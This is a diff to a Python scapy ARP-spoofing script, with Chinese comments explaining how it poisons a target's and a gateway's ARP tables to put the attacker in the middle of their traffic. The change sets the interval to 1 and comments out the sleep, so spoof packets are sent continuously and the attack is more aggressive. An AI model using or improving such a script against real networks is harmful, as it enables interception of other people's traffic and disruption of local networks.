@@ -5,7 +5,7 @@ arp欺骗：不停向某人回复自己的内网IP是网关，从而让局域网
 """
 import scapy.all as scapy
 import time
-interval = 4
+interval = 1
 ip_target = input("Enter target IP address: ")
 ip_gateway = input("Enter gateway IP address: ")
 
@@ -32,7 +32,7 @@ try:
         spoof(ip_target, ip_gateway)
         # 修改网关的ARP表。告诉真网关，我是target 真网关传回给target的所有东西都只会经过我
         spoof(ip_gateway, ip_target)
-        time.sleep(interval)
+        # time.sleep(interval)
 except KeyboardInterrupt:
     # 恢复网关的arp表
     restore(ip_gateway, ip_target)
